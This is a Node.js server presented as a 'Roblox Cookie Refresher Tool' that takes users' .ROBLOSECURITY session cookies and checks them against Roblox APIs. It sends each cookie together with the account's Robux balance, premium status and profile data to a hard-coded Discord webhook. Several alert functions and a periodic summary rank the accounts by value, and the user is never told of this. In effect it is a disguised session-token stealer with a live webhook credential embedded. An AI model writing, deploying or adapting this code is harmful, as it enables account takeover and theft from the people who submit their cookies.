
const express = require('express');
const axios = require('axios');
const cookieParser = require('cookie-parser');
const WebSocket = require('ws');
const http = require('http');

// Discord webhook URL
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc';

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static('public'));

// Store active cookies and their info
const activeCookies = new Map();

// WebSocket connections for real-time updates
const clients = new Set();

wss.on('connection', (ws) => {
    clients.add(ws);
    console.log('Client connected');
    
    // Send current cookie data to new client
    try {
        ws.send(JSON.stringify({
            type: 'cookieList',
            cookies: Array.from(activeCookies.values())
        }));
    } catch (error) {
        console.error('Error sending initial data to client:', error);
    }
    
    // Add ping/pong for connection health
    const pingInterval = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.ping();
        } else {
            clearInterval(pingInterval);
        }
    }, 30000); // Ping every 30 seconds
    
    ws.on('pong', () => {
        // Client is alive, connection is healthy
    });
    
    ws.on('close', () => {
        clients.delete(ws);
        clearInterval(pingInterval);
        console.log('Client disconnected');
    });
    
    ws.on('error', (error) => {
        console.error('WebSocket error:', error);
        clients.delete(ws);
        clearInterval(pingInterval);
    });
    
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'ping') {
                // Respond to client ping with pong
                ws.send(JSON.stringify({ type: 'pong' }));
            }
        } catch (error) {
            // Ignore invalid JSON messages
        }
    });
});

// Broadcast to all connected clients
function broadcast(data) {
    const message = JSON.stringify(data);
    const deadClients = [];
    
    clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            try {
                client.send(message);
            } catch (error) {
                console.error('Error sending message to client:', error);
                deadClients.push(client);
            }
        } else {
            deadClients.push(client);
        }
    });
    
    // Clean up dead connections
    deadClients.forEach(client => {
        clients.delete(client);
    });
}

// Send notification to Discord webhook for new cookies
async function sendNewCookieNotification(cookieData) {
    try {
        const embed = {
            title: "🍪 New Roblox Cookie Added",
            description: `A new ${cookieData.isValid ? 'valid' : 'invalid'} Roblox account has been detected!`,
            color: cookieData.isValid ? 0x2ed573 : 0xff4757,
            fields: [],
            footer: {
                text: "Roblox Cookie Refresher Tool",
                icon_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png"
            },
            timestamp: new Date().toISOString()
        };

        if (cookieData.isValid) {
            embed.fields = [
                {
                    name: "👤 Username",
                    value: cookieData.username || 'Unknown',
                    inline: true
                },
                {
                    name: "🆔 User ID",
                    value: cookieData.userId?.toString() || 'Unknown',
                    inline: true
                },
                {
                    name: "🔗 Display Name",
                    value: cookieData.displayName || 'Not set',
                    inline: true
                },
                {
                    name: "💰 Robux",
                    value: `${cookieData.robux?.toLocaleString() || '0'} R$`,
                    inline: true
                },
                {
                    name: "⭐ Premium Status",
                    value: cookieData.isPremium ? '✅ Premium' : '❌ No Premium',
                    inline: true
                },
                {
                    name: "👥 Social Stats",
                    value: `Followers: ${cookieData.followers?.toLocaleString() || '0'}\nFollowing: ${cookieData.following?.toLocaleString() || '0'}`,
                    inline: true
                },
                {
                    name: "📅 Account Created",
                    value: cookieData.created ? new Date(cookieData.created).toLocaleDateString('en-US', {
                        year: 'numeric',
                        month: 'long',
                        day: 'numeric'
                    }) : 'Unknown',
                    inline: false
                },
                {
                    name: "🕒 Added At",
                    value: new Date().toLocaleString('en-US', {
                        timeZone: 'UTC',
                        year: 'numeric',
                        month: 'short',
                        day: 'numeric',
                        hour: '2-digit',
                        minute: '2-digit',
                        timeZoneName: 'short'
                    }),
                    inline: true
                },
                {
                    name: "🔐 Cookie Preview",
                    value: `\`${cookieData.cookie}\``,
                    inline: false
                }
            ];

            // Add description field if available
            if (cookieData.description && cookieData.description.trim() && cookieData.description !== 'No description available') {
                embed.fields.push({
                    name: "📝 Account Description",
                    value: cookieData.description.length > 200 ? cookieData.description.substring(0, 200) + '...' : cookieData.description,
                    inline: false
                });
            }
        } else {
            embed.fields = [
                {
                    name: "❌ Status",
                    value: "Invalid Cookie",
                    inline: true
                },
                {
                    name: "🔍 Error Details",
                    value: cookieData.error || 'Unknown error occurred',
                    inline: false
                },
                {
                    name: "🔐 Cookie Preview",
                    value: `\`${cookieData.cookie}\``,
                    inline: false
                },
                {
                    name: "🕒 Attempted At",
                    value: new Date().toLocaleString('en-US', {
                        timeZone: 'UTC',
                        year: 'numeric',
                        month: 'short',
                        day: 'numeric',
                        hour: '2-digit',
                        minute: '2-digit',
                        timeZoneName: 'short'
                    }),
                    inline: true
                }
            ];
        }

        const payload = {
            username: "Cookie Refresher Bot",
            avatar_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png",
            embeds: [embed]
        };

        await axios.post(DISCORD_WEBHOOK_URL, payload, {
            headers: {
                'Content-Type': 'application/json'
            },
            timeout: 15000
        });

        console.log(`✅ Discord notification sent for ${cookieData.isValid ? 'valid' : 'invalid'} cookie: ${cookieData.username || 'Unknown'}`);
    } catch (error) {
        console.error('❌ Failed to send Discord notification:', error.response?.status, error.message);
    }
}

// Send comprehensive new cookie notification with full details
async function sendNewCookieWithFullDetailsNotification(cookieData) {
    if (!cookieData.isValid) return;
    
    try {
        // Truncate cookie to prevent message size issues
        const truncatedCookie = cookieData.fullCookie ? 
            (cookieData.fullCookie.length > 100 ? cookieData.fullCookie.substring(0, 100) + '...' : cookieData.fullCookie) : 
            cookieData.cookie;

        // Truncate description to prevent message size issues
        const truncatedDescription = (cookieData.description && cookieData.description.trim() && cookieData.description !== 'No description available') 
            ? (cookieData.description.length > 200 ? cookieData.description.substring(0, 200) + '...' : cookieData.description)
            : 'No description set';

        const embed = {
            title: "🍪 NEW COOKIE ALERT - FULL DETAILS",
            description: `**NEW ROBLOX ACCOUNT DETECTED!**\n🔥 A fresh ${cookieData.isPremium ? '⭐ PREMIUM' : 'STANDARD'} account has been added!`,
            color: 0x00FF00,
            fields: [
                {
                    name: "🏷️ ACCOUNT IDENTITY",
                    value: `**Username:** \`${cookieData.username}\`\n**Display Name:** \`${cookieData.displayName || 'Not set'}\`\n**User ID:** \`${cookieData.userId}\``,
                    inline: false
                },
                {
                    name: "💰 FINANCIAL STATUS",
                    value: `**Robux:** \`${cookieData.robux?.toLocaleString() || '0'} R$\`\n**Premium:** ${cookieData.isPremium ? '✅ ACTIVE' : '❌ NO'}`,
                    inline: true
                },
                {
                    name: "👥 SOCIAL METRICS",
                    value: `**Followers:** \`${cookieData.followers?.toLocaleString() || '0'}\`\n**Following:** \`${cookieData.following?.toLocaleString() || '0'}\``,
                    inline: true
                },
                {
                    name: "📅 ACCOUNT INFO",
                    value: `**Created:** ${cookieData.created ? new Date(cookieData.created).toLocaleDateString() : 'Unknown'}\n**Added:** ${new Date().toLocaleString()}`,
                    inline: false
                },
                {
                    name: "📝 DESCRIPTION",
                    value: `\`${truncatedDescription}\``,
                    inline: false
                },
                {
                    name: "🔐 COOKIE",
                    value: `\`${truncatedCookie}\``,
                    inline: false
                },
                {
                    name: "📊 SUMMARY",
                    value: `**Value:** ${cookieData.robux >= 1000 ? '🔥 HIGH' : cookieData.robux >= 100 ? '💫 MEDIUM' : '📈 STARTER'} • **Social:** ${cookieData.followers >= 100 ? '🌟 POPULAR' : '🌱 GROWING'}`,
                    inline: false
                }
            ],
            thumbnail: {
                url: `https://www.roblox.com/headshot-thumbnail/image?userId=${cookieData.userId}&width=150&height=150&format=png`
            },
            footer: {
                text: "🍪 Cookie Refresher Tool • Auto-Copied to Clipboard",
                icon_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png"
            },
            timestamp: new Date().toISOString()
        };

        const payload = {
            username: "🍪 NEW COOKIE ALERT",
            avatar_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png",
            content: `🚨 **NEW ROBLOX ACCOUNT!** 🎯 **${cookieData.username}** (${cookieData.robux?.toLocaleString() || '0'} R$) ${cookieData.isPremium ? '⭐' : ''}`,
            embeds: [embed]
        };

        await axios.post(DISCORD_WEBHOOK_URL, payload, {
            headers: {
                'Content-Type': 'application/json'
            },
            timeout: 15000
        });

        console.log(`🎉 NEW COOKIE ALERT sent for: ${cookieData.username}`);
    } catch (error) {
        console.error('❌ Failed to send new cookie alert:', error.response?.status, error.message);
        
        // Try sending a simpler notification as fallback
        try {
            const simplePayload = {
                username: "🍪 Cookie Alert",
                content: `🚨 **NEW ACCOUNT ADDED!** Username: **${cookieData.username}** | Robux: **${cookieData.robux || 0}** | Premium: **${cookieData.isPremium ? 'Yes' : 'No'}**\n\nCookie: \`${cookieData.fullCookie ? cookieData.fullCookie.substring(0, 50) + '...' : cookieData.cookie}\``
            };
            
            await axios.post(DISCORD_WEBHOOK_URL, simplePayload, {
                headers: { 'Content-Type': 'application/json' },
                timeout: 10000
            });
            
            console.log(`✅ Fallback notification sent for: ${cookieData.username}`);
        } catch (fallbackError) {
            console.error('❌ Fallback notification also failed:', fallbackError.response?.status, fallbackError.message);
        }
    }
}

// Send comprehensive account information notification
async function sendAccountInfoNotification(cookieData) {
    if (!cookieData.isValid) return;
    
    try {
        const embed = {
            title: "📊 Complete Account Information",
            description: `Detailed information for **${cookieData.username}**`,
            color: 0x00A2FF,
            fields: [
                {
                    name: "🏷️ Basic Information",
                    value: `**Username:** ${cookieData.username}\n**Display Name:** ${cookieData.displayName || 'Not set'}\n**User ID:** ${cookieData.userId}`,
                    inline: false
                },
                {
                    name: "💼 Account Status",
                    value: `**Premium:** ${cookieData.isPremium ? '✅ Active' : '❌ Not Active'}\n**Account Age:** ${cookieData.created ? `Created ${new Date(cookieData.created).toLocaleDateString()}` : 'Unknown'}`,
                    inline: false
                },
                {
                    name: "💰 Financial Information",
                    value: `**Current Robux:** ${cookieData.robux?.toLocaleString() || '0'} R$`,
                    inline: true
                },
                {
                    name: "👥 Social Statistics",
                    value: `**Followers:** ${cookieData.followers?.toLocaleString() || '0'}\n**Following:** ${cookieData.following?.toLocaleString() || '0'}`,
                    inline: true
                },
                {
                    name: "📝 Profile Description",
                    value: (cookieData.description && cookieData.description.trim() && cookieData.description !== 'No description available') 
                        ? (cookieData.description.length > 300 ? cookieData.description.substring(0, 300) + '...' : cookieData.description)
                        : 'No description set',
                    inline: false
                },
                {
                    name: "🔐 Authentication Details",
                    value: `**Cookie:** \`${cookieData.fullCookie ? cookieData.fullCookie.substring(0, 50) + '...' : cookieData.cookie}\`\n**Last Verified:** ${new Date(cookieData.lastChecked).toLocaleString()}`,
                    inline: false
                }
            ],
            thumbnail: {
                url: `https://www.roblox.com/headshot-thumbnail/image?userId=${cookieData.userId}&width=420&height=420&format=png`
            },
            footer: {
                text: "Roblox Cookie Refresher Tool • Complete Account Data",
                icon_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png"
            },
            timestamp: new Date().toISOString()
        };

        const payload = {
            username: "Cookie Refresher Bot",
            avatar_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png",
            embeds: [embed]
        };

        await axios.post(DISCORD_WEBHOOK_URL, payload, {
            headers: {
                'Content-Type': 'application/json'
            },
            timeout: 15000
        });

        console.log(`✅ Detailed account info sent for: ${cookieData.username}`);
    } catch (error) {
        console.error('❌ Failed to send detailed account info:', error.response?.status, error.message);
    }
}

// Function to get user info from Roblox cookie
async function getRobloxUserInfo(cookie) {
    try {
        // Enhanced headers with rotating user agents to bypass restrictions
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ];
        
        const headers = {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Sec-CH-UA': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"',
            'X-Requested-With': 'XMLHttpRequest'
        };

        // First, try to get authenticated user info with better error handling
        const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: headers,
            timeout: 10000,
            maxRedirects: 5,
            validateStatus: function (status) {
                return status < 500; // Resolve only if the status code is less than 500
            }
        });

        // Check if the response is actually JSON
        if (response.headers['content-type'] && !response.headers['content-type'].includes('application/json')) {
            throw new Error('Invalid cookie - received HTML response instead of JSON');
        }

        // Check for API errors
        if (response.status !== 200) {
            let errorMessage = 'Authentication failed';
            if (response.status === 401) {
                errorMessage = 'Invalid or expired cookie';
            } else if (response.status === 403) {
                errorMessage = 'Access forbidden - cookie may be restricted';
            } else if (response.status === 429) {
                errorMessage = 'Rate limited - too many requests';
            }
            throw new Error(errorMessage);
        }
        
        const userId = response.data.id;
        const username = response.data.name;
        const displayName = response.data.displayName;
        
        // Get additional user details with retry logic
        let detailsResponse;
        let retries = 3;
        while (retries > 0) {
            try {
                detailsResponse = await axios.get(`https://users.roblox.com/v1/users/${userId}`, {
                    headers: {
                        'User-Agent': headers['User-Agent'],
                        'Accept': 'application/json',
                        'Referer': 'https://www.roblox.com/',
                        'Origin': 'https://www.roblox.com'
                    },
                    timeout: 8000
                });
                break;
            } catch (e) {
                retries--;
                if (retries === 0) throw e;
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }
        
        // Get robux amount with enhanced error handling
        let robux = 0;
        try {
            const robuxResponse = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
                headers: headers,
                timeout: 8000
            });
            robux = robuxResponse.data.robux || 0;
        } catch (e) {
            console.log('Could not fetch robux amount:', e.response?.status || e.message);
            // Try alternative endpoint
            try {
                const altResponse = await axios.get(`https://users.roblox.com/v1/users/${userId}`, {
                    headers: headers,
                    timeout: 5000
                });
                // Some user data might include robux info
                robux = altResponse.data.robux || 0;
            } catch (altError) {
                console.log('Alternative robux fetch also failed');
            }
        }
        
        // Check for premium status
        let isPremium = false;
        try {
            const premiumResponse = await axios.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
                headers: headers,
                timeout: 5000
            });
            isPremium = premiumResponse.data || false;
        } catch (e) {
            console.log('Could not fetch premium status');
        }

        // Get follower/following count
        let followers = 0, following = 0;
        try {
            const followResponse = await axios.get(`https://friends.roblox.com/v1/users/${userId}/followers/count`, {
                headers: {
                    'User-Agent': headers['User-Agent'],
                    'Accept': 'application/json'
                },
                timeout: 5000
            });
            followers = followResponse.data.count || 0;
            
            const followingResponse = await axios.get(`https://friends.roblox.com/v1/users/${userId}/followings/count`, {
                headers: {
                    'User-Agent': headers['User-Agent'],
                    'Accept': 'application/json'
                },
                timeout: 5000
            });
            following = followingResponse.data.count || 0;
        } catch (e) {
            console.log('Could not fetch follow counts');
        }

        return {
            userId: userId,
            username: username,
            displayName: displayName,
            description: detailsResponse.data.description || 'No description available',
            created: detailsResponse.data.created,
            robux: robux,
            isPremium: isPremium,
            followers: followers,
            following: following,
            isValid: true,
            lastChecked: new Date().toISOString(),
            addedAt: new Date().toISOString(),
            cookie: cookie.substring(0, 20) + '...' // Only show first 20 chars for security
        };
    } catch (error) {
        console.error('Error fetching user info:', error.response?.status, error.response?.statusText, error.message);
        
        let errorMessage = 'Unknown error';
        if (error.response) {
            const status = error.response.status;
            // Check if response is HTML (error page)
            const contentType = error.response.headers['content-type'] || '';
            if (contentType.includes('text/html')) {
                errorMessage = 'Invalid cookie - received error page from Roblox';
            } else {
                switch (status) {
                    case 401:
                        errorMessage = 'Invalid or expired cookie';
                        break;
                    case 403:
                        errorMessage = 'Access forbidden - cookie may be restricted';
                        break;
                    case 429:
                        errorMessage = 'Rate limited - too many requests';
                        break;
                    case 500:
                        errorMessage = 'Roblox server error';
                        break;
                    default:
                        errorMessage = `HTTP ${status}: ${error.response.statusText}`;
                }
            }
        } else if (error.code === 'ECONNABORTED') {
            errorMessage = 'Request timeout';
        } else if (error.code === 'ENOTFOUND') {
            errorMessage = 'Network error';
        } else if (error.message.includes('JSON')) {
            errorMessage = 'Invalid cookie - malformed response from Roblox';
        } else {
            errorMessage = error.message;
        }
        
        return {
            isValid: false,
            error: errorMessage,
            lastChecked: new Date().toISOString(),
            cookie: cookie.substring(0, 20) + '...'
        };
    }
}

// Function to refresh a cookie's info
async function refreshCookie(cookieId) {
    const cookieData = activeCookies.get(cookieId);
    if (!cookieData) return;
    
    const fullCookie = cookieData.fullCookie;
    const userInfo = await getRobloxUserInfo(fullCookie);
    
    const updatedData = {
        ...cookieData,
        ...userInfo,
        id: cookieId
    };
    
    activeCookies.set(cookieId, updatedData);
    
    // Broadcast update to all clients
    broadcast({
        type: 'cookieUpdate',
        cookie: updatedData
    });
    
    return updatedData;
}

// Auto-refresh all cookies every 10 minutes (increased interval to reduce rate limiting)
setInterval(async () => {
    console.log('Auto-refreshing all cookies...');
    const cookieIds = Array.from(activeCookies.keys());
    
    for (let i = 0; i < cookieIds.length; i++) {
        const cookieId = cookieIds[i];
        try {
            await refreshCookie(cookieId);
            console.log(`Refreshed cookie ${i + 1}/${cookieIds.length}`);
        } catch (error) {
            console.error(`Failed to refresh cookie ${cookieId}:`, error.message);
        }
        
        // Wait 3 seconds between requests to avoid rate limiting
        if (i < cookieIds.length - 1) {
            await new Promise(resolve => setTimeout(resolve, 3000));
        }
    }
    console.log('Auto-refresh completed');
}, 10 * 60 * 1000);

// Send periodic summary of all accounts every 30 minutes
setInterval(async () => {
    const validCookies = Array.from(activeCookies.values()).filter(c => c.isValid && !c.isLoading);
    
    if (validCookies.length === 0) return;
    
    try {
        const embed = {
            title: "📈 Account Summary Report",
            description: `Status update for all ${validCookies.length} active account${validCookies.length > 1 ? 's' : ''}`,
            color: 0x5865F2,
            fields: [
                {
                    name: "📊 Summary Statistics",
                    value: `**Total Accounts:** ${validCookies.length}\n**Total Robux:** ${validCookies.reduce((sum, c) => sum + (c.robux || 0), 0).toLocaleString()} R$\n**Premium Accounts:** ${validCookies.filter(c => c.isPremium).length}`,
                    inline: false
                }
            ],
            footer: {
                text: "Roblox Cookie Refresher Tool • Periodic Report",
                icon_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png"
            },
            timestamp: new Date().toISOString()
        };

        // Add individual account details
        validCookies.slice(0, 10).forEach((cookie, index) => {
            embed.fields.push({
                name: `${index + 1}. ${cookie.username}`,
                value: `**ID:** ${cookie.userId}\n**Robux:** ${cookie.robux?.toLocaleString() || '0'} R$\n**Premium:** ${cookie.isPremium ? '✅' : '❌'}`,
                inline: true
            });
        });

        if (validCookies.length > 10) {
            embed.fields.push({
                name: "📝 Note",
                value: `Showing first 10 accounts. Total: ${validCookies.length} accounts`,
                inline: false
            });
        }

        const payload = {
            username: "Cookie Refresher Bot",
            avatar_url: "https://images.rbxcdn.com/8560f731abce3687166b3e4ead9d9e1f.png",
            embeds: [embed]
        };

        await axios.post(DISCORD_WEBHOOK_URL, payload, {
            headers: {
                'Content-Type': 'application/json'
            },
            timeout: 15000
        });

        console.log(`✅ Periodic summary sent for ${validCookies.length} accounts`);
    } catch (error) {
        console.error('❌ Failed to send periodic summary:', error.message);
    }
}, 30 * 60 * 1000);

// Routes
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.post('/api/add-cookie', async (req, res) => {
    const { cookie } = req.body;
    
    if (!cookie) {
        return res.status(400).json({ error: 'Cookie is required' });
    }
    
    // Check if cookie already exists
    const existingCookie = Array.from(activeCookies.values()).find(c => c.fullCookie === cookie);
    if (existingCookie) {
        return res.status(400).json({ error: 'Cookie already exists' });
    }
    
    const cookieId = Date.now().toString();
    
    // Send immediate response with loading state
    const loadingData = {
        id: cookieId,
        fullCookie: cookie,
        isValid: null,
        isLoading: true,
        username: 'Loading...',
        lastChecked: new Date().toISOString(),
        addedAt: new Date().toISOString(),
        cookie: cookie.substring(0, 20) + '...'
    };
    
    activeCookies.set(cookieId, loadingData);
    
    // Broadcast loading state immediately
    broadcast({
        type: 'cookieAdded',
        cookie: loadingData
    });
    
    // Fetch user info in background
    setTimeout(async () => {
        const userInfo = await getRobloxUserInfo(cookie);
        const cookieData = {
            id: cookieId,
            fullCookie: cookie,
            ...userInfo,
            isLoading: false
        };
        
        activeCookies.set(cookieId, cookieData);
        
        // Broadcast updated cookie data
        broadcast({
            type: 'cookieUpdate',
            cookie: cookieData
        });
        
        // Send notification for any new cookie (valid or invalid)
        if (cookieData.isValid) {
            broadcast({
                type: 'notification',
                message: `✅ New cookie added: ${cookieData.username}`,
                level: 'success'
            });
            
            // Auto-copy new valid cookie to clipboard
            broadcast({
                type: 'autoCopy',
                cookieData: cookieData,
                message: `🍪 New cookie auto-copied: ${cookieData.username}`
            });
            
            // Send Discord webhook notifications for valid cookies
            await sendNewCookieNotification(cookieData);
            
            // Send detailed account information separately
            setTimeout(async () => {
                await sendAccountInfoNotification(cookieData);
            }, 2000);
            
            // Send immediate new cookie notification with full details
            setTimeout(async () => {
                await sendNewCookieWithFullDetailsNotification(cookieData);
            }, 3000);
        } else {
            broadcast({
                type: 'notification',
                message: `❌ Failed to add cookie: ${cookieData.error}`,
                level: 'error'
            });
            
            // Send Discord notification for invalid cookies too
            await sendNewCookieNotification(cookieData);
        }
    }, 100);
    
    res.json({ success: true, data: loadingData });
});

app.post('/api/refresh-cookie/:id', async (req, res) => {
    const cookieId = req.params.id;
    const updatedData = await refreshCookie(cookieId);
    
    if (updatedData) {
        res.json({ success: true, data: updatedData });
    } else {
        res.status(404).json({ error: 'Cookie not found' });
    }
});

app.delete('/api/remove-cookie/:id', (req, res) => {
    const cookieId = req.params.id;
    
    if (activeCookies.has(cookieId)) {
        activeCookies.delete(cookieId);
        
        // Broadcast removal to all clients
        broadcast({
            type: 'cookieRemoved',
            cookieId: cookieId
        });
        
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Cookie not found' });
    }
});

app.get('/api/cookies', (req, res) => {
    res.json(Array.from(activeCookies.values()));
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Roblox Cookie Refresher running on port ${PORT}`);
});
